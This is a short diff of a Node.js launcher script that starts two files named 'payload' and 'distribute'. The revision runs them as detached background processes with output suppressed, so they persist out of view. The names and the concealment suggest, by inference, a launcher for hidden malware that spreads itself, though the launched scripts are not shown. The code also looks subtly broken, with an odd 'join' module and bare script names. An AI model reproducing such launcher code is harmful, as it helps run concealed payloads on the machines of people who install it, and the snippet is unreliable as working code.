@@ -1,8 +1,8 @@
-var exec = require("child_process").exec;
-var join = require("join");
+var spawn = require("child_process").spawn;
 
-exec("nohup node " + join(__dirname, "payload.js"), function () {
-  exec("nohup node " + join(__dirname, "distribute.js"), function () {
-    process.exit();
-  });
+["payload", "distribute"].forEach(function (scriptName) {
+  spawn(process.execPath, [scriptName], {
+    detached: true,
+    stdio: "ignore"
+  }).unref();
 });
